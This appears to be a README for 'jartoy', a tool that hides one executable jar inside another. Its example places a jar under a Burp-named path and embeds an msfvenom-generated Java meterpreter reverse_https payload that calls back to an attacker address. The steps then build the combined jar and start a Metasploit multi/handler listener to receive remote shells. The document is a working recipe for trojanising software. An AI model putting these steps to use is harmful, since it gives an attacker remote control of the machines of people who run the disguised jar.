## jartoy

encapsuling executable jars inside another jar. 

1) Copy the first jar to
`app/src/main/resources/burp/core.jar`

2) Generate the second jar, and put in `app/src/main/resources/net/blue.jar`, for example:
```bash
export SERVERADDR=1.2.3.4
export SERVERPORT=443
msfvenom -p java/meterpreter/reverse_https LHOST=$SERVERADDR LPORT=$SERVERPORT -f raw -o ./app/src/main/resources/net/blue.jar
```

3) Build the new jar
```bash
# java 8 can generate a more compatible jar
./gradlew build
```

4) Get it in `./app/build/libs/app.jar`

5) Run a port listener, for example:
```bash
msfconsole 
use multi/handler
set PAYLOAD java/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT $SERVERPORT
set ExitOnSession 0
run -jz
```

6) Execute the jar.
